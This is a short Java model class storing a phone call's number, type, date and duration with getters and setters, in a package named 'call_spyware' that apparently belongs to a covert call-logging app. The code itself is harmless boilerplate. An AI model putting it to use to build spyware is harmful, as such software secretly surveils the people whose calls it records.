package com.ngpmbewetu.call_spyware;

import java.util.Date;

public class call_Info {

    private String phnumber;
    private String call_type;
    private Date call_date;
    private String call_duration;

    public call_Info(){


    }

    public String getPhnumber() {
        return phnumber;
    }

    public void setPhnumber(String phnumber) {
        this.phnumber = phnumber;
    }

    public String getCall_type() {
        return call_type;
    }

    public void setCall_type(String call_type) {
        this.call_type = call_type;
    }

    public Date getCall_date() {
        return call_date;
    }

    public void setCall_date(Date call_date) {
        this.call_date = call_date;
    }

    public String getCall_duration() {
        return call_duration;
    }

    public void setCall_duration(String call_duration) {
        this.call_duration = call_duration;
    }
}
